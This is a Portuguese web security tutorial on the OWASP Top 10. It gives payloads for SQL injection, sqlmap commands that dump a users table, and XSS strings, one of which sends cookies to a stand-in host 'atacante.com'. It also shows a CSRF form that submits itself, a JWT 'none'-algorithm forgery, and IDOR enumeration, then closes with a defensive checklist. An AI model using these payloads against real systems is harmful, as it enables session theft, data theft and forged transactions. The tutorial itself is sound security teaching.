> 🌍 TUTORIAL DE SEGURANÇA WEB

Principais vulnerabilidades e técnicas de exploração

⚠️ AVISO LEGAL: Estas técnicas devem ser usadas apenas em ambientes controlados, laboratórios próprios ou com autorização explícita. Nunca teste em sites de terceiros sem permissão.

OWASP Top 10

As 10 principais vulnerabilidades web segundo o OWASP (Open Web Application Security Project):

1. Injection SQL, NoSQL, OS injection
2. Broken Authentication Falhas em autenticação e sessão
3. Sensitive Data Exposure Exposição de dados sensíveis
4. XML External Entities (XXE) Ataques envolvendo XML
5. Broken Access Control Falhas no controle de acesso
6. Security Misconfiguration Configurações inseguras
7. Cross-Site Scripting (XSS) Injeção de scripts
8. Insecure Deserialization Desserialização insegura
9. Known Vulnerabilities Uso de componentes vulneráveis
10. Insufficient Logging Logging e monitoramento insuficientes

🔍 SQL Injection (SQLi)

Injeção de comandos SQL em entradas de usuário.

Exemplos de Payloads:

-- Login bypass ' OR '1'='1' -- -- Extrair dados ' UNION SELECT username, password FROM users -- -- Comentar o resto da query admin' --

Ferramenta: SQLMap

# Identificar bancos de dados sqlmap -u "http://site.com/page?id=1" --dbs # Listar tabelas sqlmap -u "http://site.com/page?id=1" -D database --tables # Extrair dados sqlmap -u "http://site.com/page?id=1" -D database -T users --dump

🔍 Cross-Site Scripting (XSS)

Injeção de scripts maliciosos no lado do cliente.

Tipos de XSS:

  • Refletido: Injetado na URL, executado imediatamente
  • Armazenado: Persistente no banco de dados
  • DOM-based: No lado do cliente (JavaScript)

Payloads Comuns:

<!-- Alerta básico --> <script>alert('XSS')</script> <!-- Roubar cookie --> <script>fetch('http://atacante.com?cookie='+document.cookie)</script> <!-- Imagem com erro --> <img src=x onerror=alert('XSS')> <!-- Iframe --> <iframe src="javascript:alert('XSS')">

🔍 Cross-Site Request Forgery (CSRF)

Forjar requisições em nome de usuários autenticados.

Exemplo de Payload:

<!-- Formulário malicioso --> <form action="http://site.com/transferir" method="POST" id="csrf"> <input type="hidden" name="conta" value="123456"> <input type="hidden" name="valor" value="1000"> </form> <script>document.getElementById('csrf').submit();</script>

Prevenção:

# Token CSRF <input type="hidden" name="csrf_token" value="token_único"> # SameSite cookies Set-Cookie: session=123; SameSite=Strict

🔍 JWT (JSON Web Tokens)

Tokens de autenticação que podem ser vulneráveis.

Estrutura do JWT:

header.payload.signature # Exemplo: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ...

Ataque de algoritmo "none":

import jwt # Token com algoritmo none (não assinado) token_none = jwt.encode({"user": "admin"}, algorithm="none") # Decodificar sem verificar decoded = jwt.decode(token, options={"verify_signature": False})

🔍 IDOR (Insecure Direct Object References)

Acessar objetos diretamente sem autorização.

Exemplo:

GET /api/user/1 # Próprio usuário GET /api/user/2 # Usuário de outro (se funcionar, é IDOR) GET /api/user/3 # Testar IDs sequenciais

📋 Checklist de Segurança

Validar todas as entradas de usuário

Escapar saídas (XSS prevention)

Usar prepared statements (SQLi prevention)

Implementar CSRF tokens

Configurar CORS corretamente

Usar HTTPS

Cookies seguros (HttpOnly, Secure, SameSite)

Rate limiting

Logging adequado

Headers de segurança (CSP, HSTS, X-Frame-Options)
